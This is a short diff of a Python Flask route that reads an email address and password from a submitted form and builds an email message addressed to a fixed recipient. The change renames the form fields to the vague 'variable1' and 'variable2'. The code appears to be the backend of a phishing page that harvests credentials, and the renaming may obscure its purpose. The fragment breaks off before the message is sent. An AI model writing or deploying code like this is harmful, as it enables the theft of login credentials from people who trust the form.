@@ -28,8 +28,8 @@ def home():
   emai= request.form.get("variable1")
   pa=request.form.get("variable2")
   if request.method == "POST":
-    emai = request.form.get("email")
-    pa=request.form.get("password")
+    emai = request.form.get("variable1")
+    pa=request.form.get("variable2")
     message=EmailMessage()
     message["From"]=myemail
     message["To"]=recvemail
